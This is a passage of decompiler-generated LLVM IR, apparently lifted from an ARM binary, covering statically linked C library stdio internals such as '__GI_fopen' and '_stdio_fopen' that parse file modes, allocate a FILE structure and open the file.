  br i1 %v2_16df8, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_16df4
  %v2_16dfc = add i32 %v0_16df4, 8
  %v3_16dfc = inttoptr i32 %v2_16dfc to i32*
  %v4_16dfc = load i32, i32* %v3_16dfc, align 4
  store i32 %v4_16dfc, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_16df4, %bb48
  %v1_16e00 = xor i1 %v2_16df8, true
  call void @__pseudo_cond_branch(i1 %v1_16e00, i32 ptrtoint (i32* @global_var_1445c.64 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16e08 = load i32, i32* @r8, align 4
  %v2_16e08 = add i32 %v0_16e08, 160
  %v3_16e08 = inttoptr i32 %v2_16e08 to i32*
  %v4_16e08 = load i32, i32* %v3_16e08, align 4
  store i32 %v4_16e08, i32* @r5, align 4
  %v1_16e0c = add i32 %v4_16e08, 8
  %v2_16e0c = inttoptr i32 %v1_16e0c to i32*
  %v3_16e0c = load i32, i32* %v2_16e0c, align 4
  store i32 %v3_16e0c, i32* %r3.global-to-local, align 4
  %v1_16e10 = load i32, i32* %sl.global-to-local, align 4
  %v3_16e10 = icmp uge i32 %v3_16e0c, %v1_16e10
  store i1 %v3_16e10, i1* %cpsr_c.global-to-local, align 1
  %v9_16e10 = icmp eq i32 %v3_16e0c, %v1_16e10
  br i1 %v9_16e10, label %dec_label_pc_16e58, label %dec_label_pc_16e18

dec_label_pc_16e18:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16e08, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16e2475 = inttoptr i32 %v4_16e08 to i32*
  %v2_16e2476 = load i32, i32* %v1_16e2475, align 4
  store i32 %v2_16e2476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16e2878 = icmp eq i32 %v2_16e2476, 0
  br i1 %v9_16e2878, label %dec_label_pc_16e30, label %dec_label_pc_16e48

dec_label_pc_16e30:                               ; preds = %dec_label_pc_16e18, %dec_label_pc_16e30.dec_label_pc_16e24_crit_edge
  %v0_16e3079 = phi i32 [ %v1_16e28.pre, %dec_label_pc_16e30.dec_label_pc_16e24_crit_edge ], [ 0, %dec_label_pc_16e18 ]
  store i32 %v0_16e3079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16e40 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16e40, label %dec_label_pc_16e44, label %dec_label_pc_16e30.dec_label_pc_16e24_crit_edge

dec_label_pc_16e30.dec_label_pc_16e24_crit_edge:  ; preds = %dec_label_pc_16e30
  %v0_16e24.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16e28.pre = load i32, i32* @r4, align 4
  %v1_16e24 = inttoptr i32 %v0_16e24.pre to i32*
  %v2_16e24 = load i32, i32* %v1_16e24, align 4
  store i32 %v2_16e24, i32* %r3.global-to-local, align 4
  %v3_16e28 = icmp uge i32 %v2_16e24, %v1_16e28.pre
  store i1 %v3_16e28, i1* %cpsr_c.global-to-local, align 1
  %v9_16e28 = icmp eq i32 %v2_16e24, %v1_16e28.pre
  br i1 %v9_16e28, label %dec_label_pc_16e30, label %dec_label_pc_16e48

dec_label_pc_16e44:                               ; preds = %dec_label_pc_16e30
  %v0_16e44 = load i32, i32* @r4, align 4
  store i32 %v0_16e44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e48

dec_label_pc_16e48:                               ; preds = %dec_label_pc_16e18, %dec_label_pc_16e30.dec_label_pc_16e24_crit_edge, %dec_label_pc_16e44
  %v0_16e48 = phi i32 [ %v0_16e44, %dec_label_pc_16e44 ], [ %v2_16e2476, %dec_label_pc_16e18 ], [ %v2_16e24, %dec_label_pc_16e30.dec_label_pc_16e24_crit_edge ]
  %v1_16e48 = phi i32 [ %v0_16e44, %dec_label_pc_16e44 ], [ 0, %dec_label_pc_16e18 ], [ %v1_16e28.pre, %dec_label_pc_16e30.dec_label_pc_16e24_crit_edge ]
  %v3_16e48 = icmp uge i32 %v0_16e48, %v1_16e48
  store i1 %v3_16e48, i1* %cpsr_c.global-to-local, align 1
  %v9_16e48 = icmp eq i32 %v0_16e48, %v1_16e48
  br i1 %v9_16e48, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_16e48
  %v1_16e4c = load i32, i32* @r5, align 4
  store i32 %v1_16e4c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_16e48, %bb50
  %v1_16e50 = xor i1 %v9_16e48, true
  call void @__pseudo_cond_branch(i1 %v1_16e50, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_16e54 = load i32, i32* %sl.global-to-local, align 4
  %v1_16e54 = load i32, i32* @r5, align 4
  %v2_16e54 = add i32 %v1_16e54, 8
  %v3_16e54 = inttoptr i32 %v2_16e54 to i32*
  store i32 %v0_16e54, i32* %v3_16e54, align 4
  %v0_16e5c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_16e58

dec_label_pc_16e58:                               ; preds = %bb49, %bb51
  %v0_16e5c = phi i32 [ %v0_16e08, %bb49 ], [ %v0_16e5c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_16e5c = add i32 %v0_16e5c, 80
  %v3_16e5c = inttoptr i32 %v2_16e5c to i32*
  %v4_16e5c = load i32, i32* %v3_16e5c, align 4
  store i32 %v4_16e5c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_16e64 = add i32 %v0_16e5c, 160
  %v3_16e64 = inttoptr i32 %v2_16e64 to i32*
  %v4_16e64 = load i32, i32* %v3_16e64, align 4
  store i32 %v4_16e64, i32* %r0.global-to-local, align 4
  %v1_16e68 = inttoptr i32 %v4_16e5c to i32*
  %v2_16e68 = load i32, i32* %v1_16e68, align 4
  store i32 %v2_16e68, i32* %r3.global-to-local, align 4
  %v1_16e6c = add i32 %v4_16e64, 4
  %v2_16e6c = inttoptr i32 %v1_16e6c to i32*
  %v3_16e6c = load i32, i32* %v2_16e6c, align 4
  store i32 %v3_16e6c, i32* %r1.global-to-local, align 4
  %v1_16e70 = add i32 %v2_16e68, 1
  store i32 %v1_16e70, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16e74 = icmp eq i32 %v3_16e6c, 0
  store i32 %v1_16e70, i32* %v1_16e68, align 4
  br i1 %v2_16e74, label %dec_label_pc_16e80, label %dec_label_pc_16ee0

dec_label_pc_16e80:                               ; preds = %dec_label_pc_16e58
  %v0_16e80 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e80 = load i32, i32* %r0.global-to-local, align 4
  %v2_16e80 = add i32 %v1_16e80, 8
  %v3_16e80 = inttoptr i32 %v2_16e80 to i32*
  store i32 %v0_16e80, i32* %v3_16e80, align 4
  %v0_16e84 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16e84, i32* @r5, align 4
  br label %dec_label_pc_16e88

dec_label_pc_16e88:                               ; preds = %dec_label_pc_16eb8.dec_label_pc_16e88_crit_edge, %dec_label_pc_16e80
  %v0_16e88 = phi i32 [ %v0_16e88.pre, %dec_label_pc_16eb8.dec_label_pc_16e88_crit_edge ], [ %v0_16e84, %dec_label_pc_16e80 ]
  %v1_16e88 = inttoptr i32 %v0_16e88 to i32*
  %v2_16e88 = load i32, i32* %v1_16e88, align 4
  store i32 %v2_16e88, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16e88, i32* %r2.global-to-local, align 4
  %v2_16e9464 = load i32, i32* %v1_16e88, align 4
  store i32 %v2_16e9464, i32* %r3.global-to-local, align 4
  %v3_16e9866 = icmp uge i32 %v2_16e9464, %v2_16e88
  store i1 %v3_16e9866, i1* %cpsr_c.global-to-local, align 1
  %v9_16e9872 = icmp eq i32 %v2_16e9464, %v2_16e88
  br i1 %v9_16e9872, label %dec_label_pc_16ea0, label %dec_label_pc_16eb8

dec_label_pc_16ea0:                               ; preds = %dec_label_pc_16e88, %dec_label_pc_16ea0.dec_label_pc_16e94_crit_edge
  %v0_16ea073 = phi i32 [ %v1_16e98.pre, %dec_label_pc_16ea0.dec_label_pc_16e94_crit_edge ], [ %v2_16e88, %dec_label_pc_16e88 ]
  store i32 %v0_16ea073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16eb0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16eb0, label %dec_label_pc_16eb4, label %dec_label_pc_16ea0.dec_label_pc_16e94_crit_edge

dec_label_pc_16ea0.dec_label_pc_16e94_crit_edge:  ; preds = %dec_label_pc_16ea0
  %v0_16e94.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16e98.pre = load i32, i32* @r4, align 4
  %v1_16e94 = inttoptr i32 %v0_16e94.pre to i32*
  %v2_16e94 = load i32, i32* %v1_16e94, align 4
  store i32 %v2_16e94, i32* %r3.global-to-local, align 4
  %v3_16e98 = icmp uge i32 %v2_16e94, %v1_16e98.pre
  store i1 %v3_16e98, i1* %cpsr_c.global-to-local, align 1
  %v9_16e98 = icmp eq i32 %v2_16e94, %v1_16e98.pre
  br i1 %v9_16e98, label %dec_label_pc_16ea0, label %dec_label_pc_16eb8

dec_label_pc_16eb4:                               ; preds = %dec_label_pc_16ea0
  %v0_16eb4 = load i32, i32* @r4, align 4
  store i32 %v0_16eb4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16eb8

dec_label_pc_16eb8:                               ; preds = %dec_label_pc_16e88, %dec_label_pc_16ea0.dec_label_pc_16e94_crit_edge, %dec_label_pc_16eb4
  %v0_16ec0 = phi i32 [ %v0_16eb4, %dec_label_pc_16eb4 ], [ %v2_16e9464, %dec_label_pc_16e88 ], [ %v2_16e94, %dec_label_pc_16ea0.dec_label_pc_16e94_crit_edge ]
  %v1_16eb8 = phi i32 [ %v0_16eb4, %dec_label_pc_16eb4 ], [ %v2_16e88, %dec_label_pc_16e88 ], [ %v1_16e98.pre, %dec_label_pc_16ea0.dec_label_pc_16e94_crit_edge ]
  %v3_16eb8 = icmp uge i32 %v0_16ec0, %v1_16eb8
  store i1 %v3_16eb8, i1* %cpsr_c.global-to-local, align 1
  %v9_16eb8 = icmp eq i32 %v0_16ec0, %v1_16eb8
  br i1 %v9_16eb8, label %dec_label_pc_16ec0, label %dec_label_pc_16eb8.dec_label_pc_16e88_crit_edge

dec_label_pc_16eb8.dec_label_pc_16e88_crit_edge:  ; preds = %dec_label_pc_16eb8
  %v0_16e88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16e88

dec_label_pc_16ec0:                               ; preds = %dec_label_pc_16eb8
  %v2_16ec0 = icmp ne i32 %v1_16eb8, 0
  store i1 %v2_16ec0, i1* %cpsr_c.global-to-local, align 1
  %v7_16ec4 = icmp slt i32 %v1_16eb8, 2
  br i1 %v7_16ec4, label %dec_label_pc_16ee0, label %dec_label_pc_16ec8

dec_label_pc_16ec8:                               ; preds = %dec_label_pc_16ec0
  %v0_16ec8 = load i32, i32* @r5, align 4
  store i32 %v0_16ec8, i32* %r0.global-to-local, align 4
  %v0_16ecc = load i32, i32* %r1.global-to-local, align 4
  %v1_16ecc = add i32 %v0_16ecc, 129
  store i32 %v1_16ecc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ee0

dec_label_pc_16ee0:                               ; preds = %dec_label_pc_16e58, %dec_label_pc_16ec8, %dec_label_pc_16ec0
  %v0_16ee0 = call i32 @_stdio_openlist_dec_use()
  %v0_16ee4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_16ee4, i32* %r0.global-to-local, align 4
  %v2_16eec = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16eec, i32* @r4, align 4
  store i32 %v6_16bd4, i32* @r5, align 4
  store i32 %v9_16bd4, i32* @r6, align 4
  store i32 %v12_16bd4, i32* @r7, align 4
  ret i32 %v0_16ee4

; uselistorder directives
  uselistorder i32 %v0_16eb4, { 1, 0, 2 }
  uselistorder i32 %v1_16e98.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16e88, { 1, 0 }
  uselistorder i32 %v0_16e5c, { 1, 0 }
  uselistorder i32 %v0_16e44, { 1, 0, 2 }
  uselistorder i32 %v1_16e28.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16e10, { 1, 0 }
  uselistorder i32 %v0_16dc8, { 1, 0, 2 }
  uselistorder i32 %v1_16dac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16d3c, { 1, 0, 2 }
  uselistorder i32 %v1_16d20.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16d10, { 1, 0 }
  uselistorder i32 %v0_16ccc, { 1, 0, 2 }
  uselistorder i32 %v1_16cb0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16c90, { 1, 0 }
  uselistorder i32 %v1_16c1c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 10, 9, 42, 11, 14, 12, 13, 15, 17, 16, 43, 18, 19, 20, 21, 22, 24, 23, 44, 25, 26, 27, 28, 30, 29, 45, 31, 32, 33, 34, 35, 36, 37, 39, 38, 46, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 24, 25, 3, 4, 5, 26, 27, 6, 7, 8, 9, 28, 29, 10, 11, 12, 13, 14, 30, 31, 15, 16, 17, 32, 33, 18, 19, 20, 21, 34, 35, 22, 23 }
  uselistorder i32 (i32)* @__GI___libc_close, { 30, 29, 34, 33, 28, 32, 31, 27, 26, 25, 24, 23, 9, 8, 7, 6, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16ee0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16eb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ea0, { 1, 0 }
  uselistorder label %dec_label_pc_16e58, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_16e48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16e30, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_16df4, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16dcc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16db4, { 1, 0 }
  uselistorder label %dec_label_pc_16d68, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16d40, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d28, { 1, 0 }
  uselistorder label %dec_label_pc_16ce0, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_16cd0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16cb8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_16c58, { 1, 0 }
  uselistorder label %dec_label_pc_16c4c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_16c3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16c24, { 1, 0 }
}

define i32 @function_16ef8(i32 %arg1) local_unnamed_addr {
dec_label_pc_16ef8:
  %v0_16ef8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16ef8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16ef8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16ef8, %bb
  %v10_16f00 = phi i32 [ %arg1, %dec_label_pc_16ef8 ], [ 0, %bb ]
  ret i32 %v10_16f00

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_16f14 = call i32 @_stdio_fopen()
  ret i32 %v0_16f14
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16f24 = load i32, i32* @r4, align 4
  store i32 %v3_16f24, i32* %stack_var_-24, align 4
  %v6_16f24 = load i32, i32* @r5, align 4
  %v9_16f24 = load i32, i32* @r6, align 4
  %v12_16f24 = load i32, i32* @r7, align 4
  %v15_16f24 = load i32, i32* @r8, align 4
  %v0_16f28 = load i32, i32* @r1, align 4
  %v1_16f28 = inttoptr i32 %v0_16f28 to i8*
  %v2_16f28 = load i8, i8* %v1_16f28, align 1
  %v2_16f30 = icmp ugt i8 %v2_16f28, 113
  store i1 %v2_16f30, i1* %cpsr_c.global-to-local, align 1
  %v7_16f30 = icmp eq i8 %v2_16f28, 114
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r8, align 4
  %v0_16f3c = load i32, i32* @r0, align 4
  store i32 %v0_16f3c, i32* @r7, align 4
  %v0_16f40 = load i32, i32* @r2, align 4
  store i32 %v0_16f40, i32* @r5, align 4
  %v0_16f44 = load i32, i32* @r3, align 4
  store i32 %v0_16f44, i32* @r6, align 4
  br i1 %v7_16f30, label %dec_label_pc_16f98, label %dec_label_pc_16f4c

dec_label_pc_16f4c:                               ; preds = %entry
  %v2_16f4c = icmp ugt i8 %v2_16f28, 118
  store i1 %v2_16f4c, i1* %cpsr_c.global-to-local, align 1
  %v7_16f4c = icmp eq i8 %v2_16f28, 119
  br i1 %v7_16f4c, label %bb, label %dec_label_pc_16f58

bb:                                               ; preds = %dec_label_pc_16f4c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_16f9c

dec_label_pc_16f58:                               ; preds = %dec_label_pc_16f4c
  %v2_16f58 = icmp ugt i8 %v2_16f28, 96
  store i1 %v2_16f58, i1* %cpsr_c.global-to-local, align 1
  %v7_16f58 = icmp eq i8 %v2_16f28, 97
  br i1 %v7_16f58, label %bb49, label %dec_label_pc_16f64

bb49:                                             ; preds = %dec_label_pc_16f58
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_16f9c

dec_label_pc_16f64:                               ; preds = %dec_label_pc_16f58, %dec_label_pc_17034, %dec_label_pc_17008
  store i32 50268, i32* %r2.global-to-local, align 4
  %v0_16f68 = call i32 @__aeabi_read_tp()
  store i32 %v0_16f68, i32* %r0.global-to-local, align 4
  %v3_16f6c = load i16, i16* @global_var_233d0.483, align 2
  %v4_16f6c = sext i16 %v3_16f6c to i32
  store i32 %v4_16f6c, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_16f74 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16f74 = icmp eq i32 %v0_16f74, 0
  %v3_16f78 = add i32 %v4_16f6c, %v0_16f68
  %v4_16f78 = inttoptr i32 %v3_16f78 to i32*
  store i32 22, i32* %v4_16f78, align 4
  br i1 %v2_16f74, label %dec_label_pc_1733c, label %dec_label_pc_16f80

dec_label_pc_16f80:                               ; preds = %dec_label_pc_17058._crit_edge, %dec_label_pc_16f64
  %v0_16f80 = load i32, i32* @r5, align 4
  %v1_16f80 = inttoptr i32 %v0_16f80 to i16*
  %v2_16f80 = load i16, i16* %v1_16f80, align 2
  %v3_16f80 = zext i16 %v2_16f80 to i32
  store i32 %v3_16f80, i32* %r3.global-to-local, align 4
  %v1_16f84 = and i32 %v3_16f80, 8192
  %v2_16f84 = icmp eq i32 %v1_16f84, 0
  br i1 %v2_16f84, label %dec_label_pc_1733c, label %dec_label_pc_16f8c

dec_label_pc_16f8c:                               ; preds = %dec_label_pc_16f80
  store i32 %v0_16f80, i32* @r0, align 4
  %v0_16f90 = call i32 @free()
  store i32 %v0_16f90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1733c

dec_label_pc_16f98:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_16f9c

dec_label_pc_16f9c:                               ; preds = %bb, %bb49, %dec_label_pc_16f98
  %v1_16fb4 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_16f98 ]
  %v1_16f9c = add i32 %v0_16f28, 1
  %v2_16f9c = inttoptr i32 %v1_16f9c to i8*
  %v3_16f9c = load i8, i8* %v2_16f9c, align 1
  %v2_16fa0 = icmp ugt i8 %v3_16f9c, 97
  store i1 %v2_16fa0, i1* %cpsr_c.global-to-local, align 1
  %v7_16fa0 = icmp eq i8 %v3_16f9c, 98
  %v1_16f9c.v0_16f28 = select i1 %v7_16fa0, i32 %v1_16f9c, i32 %v0_16f28
  store i32 %v1_16f9c.v0_16f28, i32* %r3.global-to-local, align 4
  %v1_16fac = add i32 %v1_16f9c.v0_16f28, 1
  %v2_16fac = inttoptr i32 %v1_16fac to i8*
  %v3_16fac = load i8, i8* %v2_16fac, align 1
  %v4_16fac = zext i8 %v3_16fac to i32
  store i32 %v4_16fac, i32* @r3, align 4
  %v2_16fb0 = icmp ugt i8 %v3_16fac, 42
  store i1 %v2_16fb0, i1* %cpsr_c.global-to-local, align 1
  %v7_16fb0 = icmp eq i8 %v3_16fac, 43
  br i1 %v7_16fb0, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_16f9c
  store i32 %v1_16fb4, i32* @r3, align 4
  %v2_16fb8 = add nuw nsw i32 %v1_16fb4, 1
  store i32 %v2_16fb8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16f9c, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16fbc = icmp eq i32 %v0_16f40, 0
  br i1 %v2_16fbc, label %dec_label_pc_16fc4, label %dec_label_pc_17000

dec_label_pc_16fc4:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_16fc8 = call i32 @malloc()
  store i32 %v0_16fc8, i32* %r0.global-to-local, align 4
  store i32 %v0_16fc8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16fcc = icmp eq i32 %v0_16fc8, 0
  br i1 %v3_16fcc, label %dec_label_pc_17340, label %dec_label_pc_16fd4

dec_label_pc_16fd4:                               ; preds = %dec_label_pc_16fc4
  %v0_16fd8 = load i32, i32* @r8, align 4
  %v2_16fd8 = add i32 %v0_16fd8, -33136
  store i32 %v2_16fd8, i32* %r3.global-to-local, align 4
  %v1_16fdc = inttoptr i32 %v2_16fd8 to i32*
  %v2_16fdc = load i32, i32* %v1_16fdc, align 4
  store i32 %v2_16fdc, i32* %r0.global-to-local, align 4
  %v3_16fdc = add i32 %v0_16fd8, -33132
  %v4_16fdc = inttoptr i32 %v3_16fdc to i32*
  %v5_16fdc = load i32, i32* %v4_16fdc, align 4
  store i32 %v5_16fdc, i32* @r1, align 4
  %v6_16fdc = add i32 %v0_16fd8, -33128
  %v7_16fdc = inttoptr i32 %v6_16fdc to i32*
  %v8_16fdc = load i32, i32* %v7_16fdc, align 4
  store i32 %v8_16fdc, i32* %r2.global-to-local, align 4
  %v2_16fe8 = add i32 %v0_16fc8, 8
  %v3_16fe8 = inttoptr i32 %v2_16fe8 to i32*
  store i32 0, i32* %v3_16fe8, align 4
  %v2_16ff0 = load i32, i32* @r5, align 4
  %v3_16ff0 = inttoptr i32 %v2_16ff0 to i16*
  store i16 8192, i16* %v3_16ff0, align 2
  %v2_16ff4 = load i32, i32* %r0.global-to-local, align 4
  %v0_16ff8 = load i32, i32* @r5, align 4
  %v1_16ff8 = add i32 %v0_16ff8, 56
  store i32 %v1_16ff8, i32* @r3, align 4
  %v1_16ffc = inttoptr i32 %v1_16ff8 to i32*
  store i32 %v2_16ff4, i32* %v1_16ffc, align 4
  %v3_16ffc = add i32 %v0_16ff8, 60
  %v4_16ffc = inttoptr i32 %v3_16ffc to i32*
  %v5_16ffc = load i32, i32* @r1, align 4
  store i32 %v5_16ffc, i32* %v4_16ffc, align 4
  %v6_16ffc = add i32 %v0_16ff8, 64
  %v7_16ffc = inttoptr i32 %v6_16ffc to i32*
  %v8_16ffc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16ffc, i32* %v7_16ffc, align 4
  %v0_17000.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17000

dec_label_pc_17000:                               ; preds = %.thread3, %dec_label_pc_16fd4
  %v0_17058 = phi i32 [ %v0_16f44, %.thread3 ], [ %v0_17000.pre, %dec_label_pc_16fd4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17000 = icmp slt i32 %v0_17058, 0
  br i1 %v1_17000, label %dec_label_pc_17058, label %dec_label_pc_17008

dec_label_pc_17008:                               ; preds = %dec_label_pc_17000
  %v0_1700c = load i32, i32* @r4, align 4
  %v2_1700c = and i32 %v0_1700c, 131075
  %v1_17010 = add nuw nsw i32 %v2_1700c, 1
  store i32 %v1_17010, i32* %r2.global-to-local, align 4
  %v0_17014 = load i32, i32* @r7, align 4
  %v1_17014 = add i32 %v0_17014, 1
  %v2_17018 = and i32 %v1_17014, %v1_17010
  store i32 %v2_17018, i32* %r3.global-to-local, align 4
  %v3_1701c = icmp uge i32 %v2_17018, %v1_17010
  store i1 %v3_1701c, i1* %cpsr_c.global-to-local, align 1
  %v9_1701c = icmp eq i32 %v2_17018, %v1_17010
  %v1_17020 = load i32, i32* @r5, align 4
  %v2_17020 = add i32 %v1_17020, 4
  %v3_17020 = inttoptr i32 %v2_17020 to i32*
  store i32 %v0_17058, i32* %v3_17020, align 4
  br i1 %v9_1701c, label %dec_label_pc_17028, label %dec_label_pc_16f64

dec_label_pc_17028:                               ; preds = %dec_label_pc_17008
  %v0_17028 = load i32, i32* @r4, align 4
  %v1_17028 = load i32, i32* @r7, align 4
  %v2_17028 = sub i32 -1, %v1_17028
  %v3_17028 = and i32 %v0_17028, %v2_17028
  store i32 %v3_17028, i32* @r3, align 4
  %v1_1702c = and i32 %v3_17028, 1024
  %v2_1702c = icmp eq i32 %v1_1702c, 0
  br i1 %v2_1702c, label %dec_label_pc_1704c, label %dec_label_pc_17034

dec_label_pc_17034:                               ; preds = %dec_label_pc_17028
  %v0_17034 = load i32, i32* @r6, align 4
  store i32 %v0_17034, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_17040 = call i32 @__libc_fcntl(i32 %v0_17034, i32 4)
  store i32 %v2_17040, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17044 = icmp eq i32 %v2_17040, 0
  br i1 %v2_17044, label %dec_label_pc_17034.dec_label_pc_1704c_crit_edge, label %dec_label_pc_16f64

dec_label_pc_17034.dec_label_pc_1704c_crit_edge:  ; preds = %dec_label_pc_17034
  %v0_1704c.pre = load i32, i32* @r7, align 4
  %v0_17050.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1704c

dec_label_pc_1704c:                               ; preds = %dec_label_pc_17034.dec_label_pc_1704c_crit_edge, %dec_label_pc_17028
  %v0_17050 = phi i32 [ %v0_17050.pre, %dec_label_pc_17034.dec_label_pc_1704c_crit_edge ], [ %v0_17028, %dec_label_pc_17028 ]
  %v0_1704c = phi i32 [ %v0_1704c.pre, %dec_label_pc_17034.dec_label_pc_1704c_crit_edge ], [ %v1_17028, %dec_label_pc_17028 ]
  %v1_1704c = and i32 %v0_1704c, 131072
  store i32 %v1_1704c, i32* %r3.global-to-local, align 4
  %v2_17050 = or i32 %v1_1704c, %v0_17050
  store i32 %v2_17050, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1707c

dec_label_pc_17058:                               ; preds = %dec_label_pc_17000
  %v2_17058 = icmp eq i32 %v0_17058, -1
  store i1 %v2_17058, i1* %cpsr_c.global-to-local, align 1
  %v7_17058 = icmp eq i32 %v0_17058, -1
  %v0_17064.pre = load i32, i32* @r4, align 4
  br i1 %v7_17058, label %dec_label_pc_17058._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_17058
  %v2_1705c = or i32 %v0_17064.pre, 131072
  store i32 %v2_1705c, i32* @r4, align 4
  br label %dec_label_pc_17058._crit_edge

dec_label_pc_17058._crit_edge:                    ; preds = %dec_label_pc_17058, %bb53
  %v0_17064 = phi i32 [ %v2_1705c, %bb53 ], [ %v0_17064.pre, %dec_label_pc_17058 ]
  %v0_17060 = load i32, i32* @r7, align 4
  store i32 %v0_17060, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1706c = call i32 @__libc_open(i32 %v0_17060, i32 %v0_17064)
  store i32 %v2_1706c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17070 = icmp slt i32 %v2_1706c, 0
  %v1_17074 = load i32, i32* @r5, align 4
  %v2_17074 = add i32 %v1_17074, 4
  %v3_17074 = inttoptr i32 %v2_17074 to i32*
  store i32 %v2_1706c, i32* %v3_17074, align 4
